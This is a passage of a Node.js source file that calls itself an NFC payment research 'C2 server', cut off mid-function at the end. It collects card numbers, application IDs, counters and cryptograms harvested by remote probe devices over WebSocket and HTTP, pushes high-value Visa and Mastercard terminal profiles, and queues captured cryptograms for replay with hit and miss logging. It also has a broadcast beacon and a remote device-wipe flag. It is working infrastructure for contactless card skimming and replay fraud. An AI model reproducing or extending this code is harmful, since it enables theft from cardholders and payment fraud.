#!/usr/bin/env node
/**
 * NFC Payment Protocol Research Platform — C2 Server
 *
 *   Probe   →  ws://<ip>:4444/ws   (WebSocket)
 *   Browser →  http://<ip>:4444    (Research dashboard)
 *
 *   Run:  node lab/server.js [--port 4444]
 */

'use strict';

const { DatabaseSync }  = require('node:sqlite');
const { createServer }  = require('node:http');
const dgram             = require('node:dgram');
const os                = require('node:os');
const express           = require('express');
const { WebSocketServer, OPEN } = require('ws');

// ── Config ──────────────────────────────────────────────────────────────────
const args    = process.argv.slice(2);
const PORT    = parseInt(args[args.indexOf('--port') + 1] || '4444', 10) || 4444;
const DB_PATH = '/tmp/nfc_research.db';

function localIp() {
    for (const ifaces of Object.values(os.networkInterfaces())) {
        for (const i of ifaces) {
            if (i.family === 'IPv4' && !i.internal) return i.address;
        }
    }
    return '127.0.0.1';
}

// ── SQLite ──────────────────────────────────────────────────────────────────
const db = new DatabaseSync(DB_PATH);

db.exec(`
    CREATE TABLE IF NOT EXISTS collectors (
        id      INTEGER PRIMARY KEY AUTOINCREMENT,
        api_key TEXT UNIQUE NOT NULL,
        name    TEXT,
        ts      INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS cards (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        collector_id INTEGER,
        pan          TEXT NOT NULL,
        aid          TEXT,
        network      TEXT,
        raw_data     TEXT,
        ts           INTEGER NOT NULL,
        FOREIGN KEY (collector_id) REFERENCES collectors(id)
    );
    CREATE TABLE IF NOT EXISTS transactions (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        card_id  INTEGER NOT NULL,
        atc      TEXT,
        arqc     TEXT,
        un_hex   TEXT,
        time_ms  REAL,
        params   TEXT,
        cve_id   INTEGER,
        selected INTEGER DEFAULT 0,
        FOREIGN KEY (card_id) REFERENCES cards(id)
    );
    CREATE TABLE IF NOT EXISTS replay_log (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        tx_id        INTEGER,
        un_hex       TEXT,
        hit          INTEGER DEFAULT 0,
        ts           INTEGER NOT NULL,
        collector_id INTEGER
    );
    CREATE TABLE IF NOT EXISTS cves (
        id        INTEGER PRIMARY KEY,
        name      TEXT,
        amount    INTEGER,
        mc_tags   TEXT,
        visa_tags TEXT
    );
`);

// ── Migrate old sessions/samples schema if present ──────────────────────────
try {
    const hasOld = db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'").get();
    if (hasOld) {
        const cardsEmpty = db.prepare('SELECT COUNT(*) AS n FROM cards').get().n === 0;
        if (cardsEmpty) {
            const now = Math.floor(Date.now() / 1000);
            db.prepare("INSERT OR IGNORE INTO collectors (api_key,name,ts) VALUES (?,?,?)")
              .run('research-1', 'Default Collector', now);
            const cid = db.prepare("SELECT id FROM collectors WHERE api_key='research-1'").get().id;
            const oldSessions = db.prepare('SELECT * FROM sessions').all();
            for (const s of oldSessions) {
                db.prepare('INSERT INTO cards (id,collector_id,pan,aid,network,raw_data,ts) VALUES (?,?,?,?,?,?,?)')
                  .run(s.id, cid, s.pan, s.aid || '', s.network || '', s.raw_data || '', s.ts);
            }
            const oldSamples = db.prepare('SELECT * FROM samples').all();
            for (const s of oldSamples) {
                let params = {};
                try { params = JSON.parse(s.params || '{}'); } catch {}
                if (s.nonce) params['9F37'] = s.nonce;
                if (s.amount) params['9F02'] = s.amount;
                if (s.date) params['9A'] = s.date;
                db.prepare('INSERT INTO transactions (id,card_id,atc,arqc,un_hex,time_ms,params,cve_id,selected) VALUES (?,?,?,?,?,?,?,?,?)')
                  .run(s.id, s.sess_id, s.atc || '', s.ac || '', s.nonce || '', s.time_ms || 0,
                       JSON.stringify(params), s.profile || null, s.selected || 0);
            }
            console.log(`  [MIGRATE] ${oldSessions.length} sessions + ${oldSamples.length} samples → new schema`);
        }
        db.exec('DROP TABLE IF EXISTS samples; DROP TABLE IF EXISTS sessions;');
    }
} catch (e) {
    console.log(`  [MIGRATE] skip: ${e.message}`);
}

// ── Auth helpers ────────────────────────────────────────────────────────────
function getApiKey(req) {
    const auth = req.headers['authorization'];
    if (auth && auth.startsWith('Bearer ')) return auth.slice(7).trim();
    if (req.headers['x-api-key']) return req.headers['x-api-key'].trim();
    if (req.query && req.query.key) return req.query.key.trim();
    if (req.body && req.body.api_key) return req.body.api_key.trim();
    return null;
}

function getOrCreateCollector(apiKey) {
    if (!apiKey) return null;
    let c = db.prepare('SELECT id,name FROM collectors WHERE api_key=?').get(apiKey);
    if (!c) {
        const ts = Math.floor(Date.now() / 1000);
        const id = db.prepare('INSERT INTO collectors (api_key,name,ts) VALUES (?,?,?)').run(apiKey, apiKey, ts).lastInsertRowid;
        c = { id, name: apiKey };
    }
    return c;
}

// ── DB helpers ──────────────────────────────────────────────────────────────
function extractNonce(params) {
    if (!params) return '';
    try {
        const p = typeof params === 'string' ? JSON.parse(params) : params;
        return p['9F37'] || p['9f37'] || '';
    } catch { return ''; }
}

function dbStoreCapture(collectorId, pan, aid, network, rawData, txs, ts) {
    const rawStr = typeof rawData === 'object' ? JSON.stringify(rawData) : (rawData || '');
    let cardId;
    const existing = db.prepare('SELECT id FROM cards WHERE pan=? AND aid=? AND collector_id IS ?').get(pan, aid, collectorId);
    if (existing) {
        cardId = existing.id;
        if (rawStr) db.prepare('UPDATE cards SET raw_data=? WHERE id=?').run(rawStr, cardId);
    } else {
        cardId = db.prepare(
            'INSERT INTO cards (collector_id,pan,aid,network,raw_data,ts) VALUES (?,?,?,?,?,?)'
        ).run(collectorId, pan, aid || '', network || '', rawStr, ts).lastInsertRowid;
    }
    const ins = db.prepare(
        'INSERT INTO transactions (card_id,atc,arqc,un_hex,time_ms,params,cve_id,selected) VALUES (?,?,?,?,?,?,?,0)'
    );
    for (const tx of txs) {
        const paramsObj = typeof tx.params === 'object' ? tx.params : (() => { try { return JSON.parse(tx.params||'{}'); } catch { return {}; } })();
        const paramsStr = JSON.stringify(paramsObj);
        const un = extractNonce(paramsObj);
        ins.run(cardId, tx.atc||'', tx.arqc||tx.ac||'', un, tx.time_ms||0, paramsStr, tx.cve_id||null);
    }
    return txs.length;
}

function dbGetSessions(collectorId) {
    const cardRows = collectorId != null
        ? db.prepare('SELECT id,pan,aid,network,raw_data,ts FROM cards WHERE collector_id=? ORDER BY ts DESC').all(collectorId)
        : db.prepare('SELECT id,pan,aid,network,raw_data,ts FROM cards ORDER BY ts DESC').all();

    return cardRows.map(c => {
        let raw = {};
        try { raw = c.raw_data ? JSON.parse(c.raw_data) : {}; } catch {}
        const txRows = db.prepare(`
            SELECT t.id, t.atc, t.arqc, t.un_hex, t.time_ms, t.params, t.cve_id, t.selected,
                (SELECT hit FROM replay_log WHERE tx_id=t.id ORDER BY ts DESC LIMIT 1) AS last_hit,
                (SELECT COUNT(*) FROM replay_log WHERE tx_id=t.id) AS replay_attempts
            FROM transactions t WHERE t.card_id=? ORDER BY t.id ASC
        `).all(c.id);

        const transactions = txRows.map(t => {
            let p = {};
            try { p = t.params ? JSON.parse(t.params) : {}; } catch {}
            return {
                id: t.id, atc: t.atc, arqc: t.arqc,
                un: t.un_hex || '', amount: p['9F02'] || p['9f02'] || '',
                date: p['9A'] || p['9a'] || '',
                cve_id: t.cve_id, time_ms: t.time_ms, params: p,
                last_hit: t.last_hit, replay_attempts: t.replay_attempts || 0
            };
        });
        return {
            id: c.id, pan: c.pan, aid: c.aid, network: c.network,
            raw_data: raw, ts: c.ts, sample_count: transactions.length, transactions
        };
    });
}

function dbGetReplay(collectorId) {
    if (collectorId != null) {
        return db.prepare(`
            SELECT c.pan, c.aid, t.atc AS atc_hex, t.un_hex, t.arqc AS arqc_hex
            FROM transactions t JOIN cards c ON c.id=t.card_id
            WHERE t.selected=1 AND t.un_hex!='' AND c.collector_id=?
            ORDER BY t.id DESC
        `).all(collectorId);
    }
    return db.prepare(`
        SELECT c.pan, c.aid, t.atc AS atc_hex, t.un_hex, t.arqc AS arqc_hex
        FROM transactions t JOIN cards c ON c.id=t.card_id
        WHERE t.selected=1 AND t.un_hex!=''
        ORDER BY t.id DESC
    `).all();
}

function dbSetSelected(ids, collectorId) {
    if (collectorId != null) {
        db.prepare(`UPDATE transactions SET selected=0 WHERE card_id IN (SELECT id FROM cards WHERE collector_id=?)`).run(collectorId);
    } else {
        db.exec('UPDATE transactions SET selected=0');
    }
    if (ids.length > 0) {
        const pl = ids.map(() => '?').join(',');
        db.prepare(`UPDATE transactions SET selected=1 WHERE id IN (${pl})`).run(...ids);
    }
}

function dbGetStats(collectorId) {
    let sessions, samples, queue, hits;
    if (collectorId != null) {
        sessions = db.prepare('SELECT COUNT(*) AS n FROM cards WHERE collector_id=?').get(collectorId).n;
        samples  = db.prepare('SELECT COUNT(*) AS n FROM transactions t JOIN cards c ON c.id=t.card_id WHERE c.collector_id=?').get(collectorId).n;
        queue    = db.prepare('SELECT COUNT(*) AS n FROM transactions t JOIN cards c ON c.id=t.card_id WHERE t.selected=1 AND c.collector_id=?').get(collectorId).n;
        hits     = db.prepare('SELECT COUNT(*) AS n FROM replay_log WHERE hit=1 AND collector_id=?').get(collectorId).n;
    } else {
        sessions = db.prepare('SELECT COUNT(*) AS n FROM cards').get().n;
        samples  = db.prepare('SELECT COUNT(*) AS n FROM transactions').get().n;
        queue    = db.prepare('SELECT COUNT(*) AS n FROM transactions WHERE selected=1').get().n;
        hits     = db.prepare('SELECT COUNT(*) AS n FROM replay_log WHERE hit=1').get().n;
    }
    return { sessions, samples, queue, hits };
}

function dbClear(collectorId) {
    if (collectorId != null) {
        const cardIds = db.prepare('SELECT id FROM cards WHERE collector_id=?').all(collectorId).map(r => r.id);
        if (cardIds.length) {
            const pl = cardIds.map(() => '?').join(',');
            db.prepare(`DELETE FROM replay_log WHERE tx_id IN (SELECT id FROM transactions WHERE card_id IN (${pl}))`).run(...cardIds);
            db.prepare(`DELETE FROM transactions WHERE card_id IN (${pl})`).run(...cardIds);
            db.prepare(`DELETE FROM cards WHERE collector_id=?`).run(collectorId);
        }
    } else {
        db.exec('DELETE FROM replay_log; DELETE FROM transactions; DELETE FROM cards;');
    }
}

// ── Profile config ──────────────────────────────────────────────────────────
const PROFILE_CONFIG = {
    name: 'research-lab',
    cves: [
        { id:1, name:'visa-inr', amount:100000, mastercard_tags:{},
          visa_tags:{'9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0356','5F2A':'0356','95':'0000000000','9C':'00'} },
        { id:2, name:'visa-usd', amount:100000, mastercard_tags:{},
          visa_tags:{'9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0840','5F2A':'0840','95':'0000000000','9C':'00'} },
        { id:3, name:'visa-gbp', amount:100000, mastercard_tags:{},
          visa_tags:{'9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0826','5F2A':'0826','95':'0000000000','9C':'00'} },
        { id:4, name:'visa-eur', amount:100000, mastercard_tags:{},
          visa_tags:{'9F66':'B6004000','9F37':'A1B2C3D4','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0978','5F2A':'0978','95':'0000000000','9C':'00'} },
        { id:5, name:'mc-inr',  amount:100000, visa_tags:{},
          mastercard_tags:{'9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0356','5F2A':'0356','95':'0000000000','9C':'00'} },
        { id:6, name:'mc-usd',  amount:100000, visa_tags:{},
          mastercard_tags:{'9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0840','5F2A':'0840','95':'0000000000','9C':'00'} },
        { id:7, name:'mc-gbp',  amount:100000, visa_tags:{},
          mastercard_tags:{'9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0826','5F2A':'0826','95':'0000000000','9C':'00'} },
        { id:8, name:'mc-eur',  amount:100000, visa_tags:{},
          mastercard_tags:{'9F66':'B6004000','9F37':'B2C3D4E5','9F03':'000000000000','9F35':'22','9F33':'E0F8C8','9F1A':'0978','5F2A':'0978','95':'0000000000','9C':'00'} },
    ],
    latest_version: null
};

let clearPending = false;
function profileResponse() {
    const r = { ...PROFILE_CONFIG, clear_device: clearPending };
    clearPending = false;
    return r;
}

// ── SSE ─────────────────────────────────────────────────────────────────────
const sseClients = new Set();
function sseBroadcast(event, data) {
    const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of sseClients) {
        try { res.write(msg); } catch { sseClients.delete(res); }
    }
}

// ── Express routes ───────────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.disable('x-powered-by');

app.get('/', (_req, res) => res.type('html').send(buildHtml()));

app.get('/events', (req, res) => {
    res.set({ 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache',
              'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*' });
    res.flushHeaders();
    res.write('event: ping\ndata: {}\n\n');
    sseClients.add(res);
    const hb = setInterval(() => { try { res.write('event: ping\ndata: {}\n\n'); } catch {} }, 25000);
    req.on('close', () => { clearInterval(hb); sseClients.delete(res); });
});

app.get('/me', (_req, res) => res.json(profileResponse()));

app.get('/api/sessions', (req, res) => {
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    res.json(dbGetSessions(collector?.id ?? null));
});

app.get('/api/cards', (req, res) => {   // compat alias
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    res.json(dbGetSessions(collector?.id ?? null));
});

app.get('/api/replay', (req, res) => {
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    res.json(dbGetReplay(collector?.id ?? null));
});

app.get('/api/stats', (req, res) => {
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    res.json(dbGetStats(collector?.id ?? null));
});

app.post('/api/select', (req, res) => {
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    const ids = (req.body.ids || []).map(Number).filter(n => n > 0);
    dbSetSelected(ids, collector?.id ?? null);
    sseBroadcast('selection', { count: ids.length });
    console.log(`  [SELECT]  ${ids.length} transactions queued for replay`);
    res.json({ selected: ids.length });
});

app.post('/api/replay_result', (req, res) => {
    const { un_hex='', arqc_hex='', hit } = req.body || {};
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    const ts = Math.floor(Date.now() / 1000);

    let txId = null;
    if (arqc_hex) {
        const tx = db.prepare('SELECT id FROM transactions WHERE arqc=? LIMIT 1').get(arqc_hex);
        txId = tx?.id ?? null;
    }

    db.prepare('INSERT INTO replay_log (tx_id,un_hex,hit,ts,collector_id) VALUES (?,?,?,?,?)')
      .run(txId, un_hex, hit ? 1 : 0, ts, collector?.id ?? null);

    const result = hit ? '⚡ HIT' : '✗ MISS';
    console.log(`  [REPLAY]  UN=${un_hex} ${result}`);
    sseBroadcast('replay_result', { un_hex, hit: hit ? 1 : 0, tx_id: txId });
    res.json({ result: 'ok' });
});

app.delete('/api/clear', (req, res) => {
    const key = getApiKey(req);
    const collector = key ? getOrCreateCollector(key) : null;
    dbClear(collector?.id ?? null);
    clearPending = true;
    sseBroadcast('clear', {});
    wssBroadcast(JSON.stringify({ type: 'clear' }));
    res.json({ status: 'cleared' });
});

app.post('/harvest', (req, res) => {
    const { pan='', aid='', network='', raw_data='', harvested_txs, txs } = req.body || {};
    const key = getApiKey(req) || 'research-1';
    const collector = getOrCreateCollector(key);
    const allTxs = harvested_txs || txs || [];
    const ts = Math.floor(Date.now() / 1000);
    const stored = dbStoreCapture(collector.id, pan, aid, network, raw_data, allTxs, ts);
    console.log(`  [CAPTURE]  PAN=${pan}  txs=${stored}  key=${key}`);
    sseBroadcast('capture', { pan, aid, network, sample_count: stored });
    res.json({ result: 'ok', stored });
});

app.post('/update_apk', (_req, res) => res.json({ result: 'Success', update: false }));
app.options('*', (_req, res) => {
    res.set({ 'Access-Control-Allow-Origin': '*',
              'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
              'Access-Control-Allow-Headers': 'Content-Type,Authorization,X-Api-Key' }).sendStatus(204);
});

// ── HTTP + WebSocket server ──────────────────────────────────────────────────
const server = createServer(app);
let wss;

function wssBroadcast(text) {
    for (const ws of wss.clients) {
        if (ws.readyState === OPEN) ws.send(text);
    }
}

server.listen(PORT, '0.0.0.0', () => {
    const ip = localIp();
    wss = new WebSocketServer({ server, path: '/ws' });

    wss.on('connection', (ws, req) => {
        const addr = req.socket.remoteAddress;
        console.log(`  [WS] probe connected from ${addr}`);
        sseBroadcast('ws_clients', { count: wss.clients.size });

        ws.isAlive = true;
        ws.on('pong', () => { ws.isAlive = true; });
        ws.send(JSON.stringify({ type: 'config', ...profileResponse() }));

        ws.on('message', raw => {
            let msg;
            try { msg = JSON.parse(raw.toString()); } catch { return; }
            const t = msg.type || '';

            if (t === 'harvest') {
                const { pan='', aid='', network='', raw_data='',
                        harvested_txs, txs: txsAlt, api_key } = msg;
                const key = api_key || 'research-1';
                const collector = getOrCreateCollector(key);
                const txs = harvested_txs || txsAlt || [];
                const ts  = Math.floor(Date.now() / 1000);
                const stored = dbStoreCapture(collector.id, pan, aid, network, raw_data, txs, ts);
                console.log(`  [CAPTURE]  PAN=${pan}  AID=${aid}  network=${network}  samples=${stored}  key=${key}`);
                sseBroadcast('capture', { pan, aid, network, sample_count: stored });
                ws.send(JSON.stringify({ type: 'ack', result: 'ok', stored }));

            } else if (t === 'get_config' || t === 'hello') {
                ws.send(JSON.stringify({ type: 'config', ...profileResponse() }));
            }
        });

        ws.on('close', () => {
            console.log(`  [WS] probe disconnected from ${addr}`);
            sseBroadcast('ws_clients', { count: wss.clients.size });
        });
        ws.on('error', err => console.log(`  [WS] error from ${addr}: ${err.message}`));
    });

    const heartbeat = setInterval(() => {
        for (const ws of wss.clients) {
            if (ws.isAlive === false) { ws.terminate(); continue; }
            ws.isAlive = false; ws.ping();
        }
    }, 15000);
    wss.on('close', () => clearInterval(heartbeat));

    console.log();
    console.log('━'.repeat(58));
    console.log('  NFC Research C2');
    console.log();
    console.log(`  Dashboard  →  http://localhost:${PORT}`);
    console.log(`  Remote     →  http://${ip}:${PORT}`);
    console.log(`  WebSocket  →  ws://${ip}:${PORT}/ws`);
    console.log('━'.repeat(58));
    console.log();
});

// ── UDP beacon ───────────────────────────────────────────────────────────────
(function startBeacon() {
    const sock = dgram.createSocket('udp4');
    sock.bind(0, () => {
        sock.setBroadcast(true);
        const msg = Buffer.from(JSON.stringify({ type: 'harvest_server', port: PORT }));
        setInterval(() => sock.send(msg, 0, msg.length, 4445, '255.255.255.255'), 3000);
    });
})();

// ── Dashboard HTML ───────────────────────────────────────────────────────────
function buildHtml() { return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Research C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0e1a;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;padding-bottom:70px}
/* Login overlay */
#loginOverlay{position:fixed;inset:0;background:#0a0e1a;display:flex;align-items:center;justify-content:center;z-index:200}
.login-box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px 36px;width:360px;text-align:center}
.login-box h2{font-size:18px;font-weight:700;color:#fff;margin-bottom:8px}
.login-box p{color:#8b949e;font-size:13px;margin-bottom:20px}
.login-box input{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:7px;padding:9px 12px;color:#e6edf3;font-size:14px;margin-bottom:12px;outline:none}
.login-box input:focus{border-color:#58a6ff}
.login-box .hint{color:#484f58;font-size:11px;margin-top:10px}
.login-box .hint code{color:#58a6ff;background:#0d1117;padding:1px 5px;border-radius:3px}
/* Header */
header{background:#161b22;border-bottom:1px solid #21262d;padding:10px 20px;display:flex;align-items:center;gap:10px}
header h1{font-size:15px;font-weight:700;color:#fff;flex:1}
.dot{width:8px;height:8px;border-radius:50%;background:#484f58;transition:background .4s;flex-shrink:0}
.dot.live{background:#3fb950;box-shadow:0 0 5px #3fb950}
.key-badge{font-size:11px;color:#58a6ff;background:#0d2044;border:1px solid #1f4d8f;padding:2px 8px;border-radius:12px;font-family:monospace}
.hdr-btns{display:flex;gap:6px}
/* Buttons */
button{padding:5px 12px;border-radius:6px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;font-size:12px;cursor:pointer;white-space:nowrap}
button:hover{background:#2d333b}
button.danger{border-color:#6e2020;color:#f85149}
button.danger:hover{background:#2d1515}
button.primary{background:#1f4d8f;border-color:#388bfd;color:#fff;font-weight:600}
button.primary:hover{background:#1f6feb}
button.sm{padding:2px 7px;font-size:10px;color:#8b949e;margin-left:4px;border:none;background:none;cursor:pointer}
button.sm:hover{color:#58a6ff}
/* Stats bar */
.stats{display:flex;gap:10px;padding:10px 20px;background:#0d1117;border-bottom:1px solid #21262d;flex-wrap:wrap;align-items:center}
.sc{display:flex;align-items:baseline;gap:5px}
.sc .v{font-size:20px;font-weight:700;color:#58a6ff}
.sc .l{font-size:10px;color:#484f58;text-transform:uppercase;letter-spacing:.5px}
.sc+.sc::before{content:'';width:1px;height:24px;background:#21262d;align-self:center;margin-right:2px}
.sc.hits .v{color:#3fb950}
/* Filter chips */
.filters{display:flex;gap:6px;padding:10px 20px;background:#0a0e1a;border-bottom:1px solid #21262d;flex-wrap:wrap;align-items:center}
.filters span{color:#484f58;font-size:11px;margin-right:2px}
.chip{padding:3px 10px;border-radius:12px;border:1px solid #30363d;background:#0d1117;color:#8b949e;font-size:11px;cursor:pointer}
.chip:hover{border-color:#58a6ff;color:#58a6ff}
.chip.active{background:#0d2044;border-color:#388bfd;color:#58a6ff;font-weight:600}
/* Main */
.main{padding:14px 18px;display:flex;flex-direction:column;gap:10px}
.empty{color:#484f58;font-style:italic;padding:40px;text-align:center}
/* Card blocks */
.card-block{background:#161b22;border:1px solid #21262d;border-radius:9px;overflow:hidden}
.card-head{display:flex;align-items:center;gap:8px;padding:9px 13px;background:#0d1117;cursor:pointer;flex-wrap:wrap}
.card-head:hover{background:#0f1621}
.card-head .pan{font-family:monospace;color:#e6edf3;font-size:14px;font-weight:600;letter-spacing:1px}
.card-head .net{color:#58a6ff;font-weight:600;font-size:11px;background:#0d2044;border:1px solid #1f4d8f;padding:1px 7px;border-radius:16px}
.card-head .cnt{color:#3fb950;font-size:11px}
.card-head .ts{color:#484f58;font-size:11px;margin-left:auto}
.card-head .hd-acts{display:flex;gap:5px;margin-left:6px}
.tx-wrap{display:none}
.tx-wrap.open{display:block}
.grp-head{padding:4px 13px;font-size:11px;color:#8b949e;background:#080c14;border-top:1px solid #21262d;display:flex;align-items:center;gap:8px}
.grp-head label{display:flex;align-items:center;gap:4px;cursor:pointer;color:#58a6ff;font-weight:600;font-size:10px}
.grp-date{color:#484f58}
/* Table */
table{width:100%;border-collapse:collapse;font-size:11px}
th{color:#484f58;text-align:left;padding:4px 9px;font-weight:500;border-bottom:1px solid #21262d;background:#0a0e1a;white-space:nowrap}
td{padding:4px 9px;font-family:monospace;border-bottom:1px solid #0f131c;vertical-align:middle}
tr:hover td{background:#0c1120}
tr.sel-row td{background:#0e1d35 !important}
.ac{color:#ff7b72}.nonce{color:#ffa657}.atc{color:#d2a8ff}.amt{color:#3fb950}.dim{color:#8b949e}
/* Replay badge */
.badge-hit{color:#3fb950;font-size:10px;font-weight:700}
.badge-miss{color:#f85149;font-size:10px}
.badge-none{color:#484f58;font-size:10px}
/* Tags */
.tags-tog{font-size:10px;color:#484f58;cursor:pointer;text-decoration:underline}
.tags-tog:hover{color:#58a6ff}
.pblock{display:none;margin-top:3px;background:#0a0e1a;border:1px solid #21262d;border-radius:4px;padding:5px}
.pblock.open{display:block}
.pkv{display:grid;grid-template-columns:auto 1fr;gap:2px 8px;font-size:10px}
.pk{color:#484f58}.pv{color:#c9d1d9;word-break:break-all}
input[type=checkbox]{accent-color:#58a6ff;width:12px;height:12px;cursor:pointer;vertical-align:middle}
.chev{display:inline-block;transition:transform .15s;margin-right:3px;color:#484f58;font-size:10px}
.chev.open{transform:rotate(90deg)}
/* Selection bar */
.sel-bar{position:fixed;bottom:0;left:0;right:0;background:#161b22;border-top:2px solid #58a6ff;padding:10px 20px;display:flex;align-items:center;gap:12px;z-index:100;transition:border-top-color .4s}
.sel-bar.hidden{display:none}
.sel-info{color:#58a6ff;font-weight:600;flex:1}
.sel-bar button.primary{padding:7px 18px;font-size:13px}
</style>
</head>
<body>

<!-- Login overlay -->
<div id="loginOverlay">
  <div class="login-box">
    <h2>Research C2</h2>
    <p>Enter your collector API key</p>
    <input id="keyInput" type="text" placeholder="e.g. research-1" autocomplete="off"
           onkeydown="if(event.key==='Enter')login()">
    <button class="primary" style="width:100%;padding:9px" onclick="login()">Enter</button>
    <div class="hint">Default key: <code>research-1</code></div>
  </div>
</div>

<header>
  <h1>Research C2</h1>
  <div class="dot" id="dot"></div>
  <span class="key-badge" id="keyBadge"></span>
  <div class="hdr-btns">
    <button class="danger" onclick="clearAll()">🗑 Clear</button>
    <button onclick="exportAll()">⬇ Export</button>
    <button onclick="logout()" style="color:#484f58">Sign out</button>
  </div>
</header>

<div class="stats">
  <div class="sc"><span class="v" id="sSess">0</span><span class="l">Sessions</span></div>
  <div class="sc"><span class="v" id="sSamples">0</span><span class="l">Samples</span></div>
  <div class="sc"><span class="v" id="sQueue" style="color:#3fb950">0</span><span class="l">Queue</span></div>
  <div class="sc hits"><span class="v" id="sHits">0</span><span class="l">⚡ Hits</span></div>
  <div class="sc"><span class="v" id="sLast" style="font-size:13px;color:#8b949e">—</span><span class="l">Last tap</span></div>
</div>

<div class="filters">
  <span>Network:</span>
  <button class="chip active" id="fNet-" onclick="setFilter('net','')">All</button>
  <button class="chip" id="fNet-VISA" onclick="setFilter('net','VISA')">Visa</button>
  <button class="chip" id="fNet-MC" onclick="setFilter('net','MC')">MC</button>
  <span style="margin-left:8px">Currency:</span>
  <button class="chip active" id="fCur-" onclick="setFilter('cur','')">All</button>
  <button class="chip" id="fCur-INR" onclick="setFilter('cur','INR')">₹ INR</button>
  <button class="chip" id="fCur-USD" onclick="setFilter('cur','USD')">$ USD</button>
  <button class="chip" id="fCur-GBP" onclick="setFilter('cur','GBP')">£ GBP</button>
  <button class="chip" id="fCur-EUR" onclick="setFilter('cur','EUR')">€ EUR</button>
  <button style="margin-left:auto" onclick="selectFiltered()">☑ Select filtered</button>
</div>

<div class="main">
  <div id="sessionList"><div class="empty">Waiting for card tap…</div></div>
</div>

<div id="selBar" class="sel-bar hidden">
  <span class="sel-info" id="selCount">0 selected</span>
  <button class="primary" onclick="pushToMoksha()">⚡ Push to Moksha</button>
  <button onclick="clearSel()">✕ Clear</button>
</div>

<script>
const EMV={"9F37":"Nonce","9A":"Date","9F02":"Amount","9F03":"Amt Other","9C":"Tx Type","9F1A":"Country","5F2A":"Currency","9F33":"Term Caps","9F35":"Term Type","9F66":"TTQ","95":"TVR"};
const CURR={"0356":{s:"₹",c:"INR",d:2},"0840":{s:"$",c:"USD",d:2},"0826":{s:"£",c:"GBP",d:2},"0978":{s:"€",c:"EUR",d:2},"0036":{s:"A$",c:"AUD",d:2},"0124":{s:"C$",c:"CAD",d:2},"0784":{s:"AED ",c:"AED",d:2},"0702":{s:"S$",c:"SGD",d:2},"0392":{s:"¥",c:"JPY",d:0},"0458":{s:"RM ",c:"MYR",d:2}};
const CUR_CODE={"INR":"0356","USD":"0840","GBP":"0826","EUR":"0978"};

function fmtAmt(raw,p){
  if(!raw)return'—';
  const c=CURR[p?.['5F2A']||p?.['5f2a']||'0840']||{s:'',c:'',d:2};
  const v=parseInt(raw,10);
  if(isNaN(v)||v===0)return'—';
  return c.s+(c.d===0?v.toLocaleString():(v/Math.pow(10,c.d)).toFixed(c.d))+' <span style="color:#484f58;font-size:10px">'+c.c+'</span>';
}

// ── Auth ────────────────────────────────────────────────────────────────────
let API_KEY = localStorage.getItem('api_key') || '';
function login(){
  const k=document.getElementById('keyInput').value.trim();
  if(!k)return;
  localStorage.setItem('api_key',k); API_KEY=k;
  document.getElementById('loginOverlay').style.display='none';
  document.getElementById('keyBadge').textContent=k;
  fetchSessions();
}
function logout(){
  localStorage.removeItem('api_key'); API_KEY='';
  document.getElementById('loginOverlay').style.display='flex';
  document.getElementById('keyInput').value='';
  sessions=[]; selectedIds.clear(); render(); stats();
}
function apiUrl(path){ return path+(path.includes('?')?'&':'?')+'key='+encodeURIComponent(API_KEY); }

// Init: if key already in localStorage, skip login screen
if(API_KEY){
  document.getElementById('loginOverlay').style.display='none';
  document.getElementById('keyBadge').textContent=API_KEY;
}

// ── Filters ─────────────────────────────────────────────────────────────────
let filterNet='', filterCur='';
function setFilter(type,val){
  if(type==='net'){filterNet=filterNet===val?'':val;}
  else{filterCur=filterCur===val?'':val;}
  document.querySelectorAll('.chip').forEach(c=>{
    const id=c.id; if(!id)return;
    if(id.startsWith('fNet-'))c.classList.toggle('active',filterNet===(id.slice(5)));
    if(id.startsWith('fCur-'))c.classList.toggle('active',filterCur===(id.slice(5)));
  });
  render();
}
function matchesTx(sess,tx){
  if(filterNet){
    const n=(sess.network||'').toUpperCase();
    if(filterNet==='VISA'&&!n.includes('VISA'))return false;
    if(filterNet==='MC'&&!n.includes('MASTER'))return false;
  }
  if(filterCur){
    const cur=(tx.params?.['5F2A']||tx.params?.['5f2a']||'');
    if(CUR_CODE[filterCur]&&cur!==CUR_CODE[filterCur])return false;
  }
  return true;
}
function selectFiltered(){
  sessions.forEach(s=>{
    (s.transactions||[]).forEach(t=>{
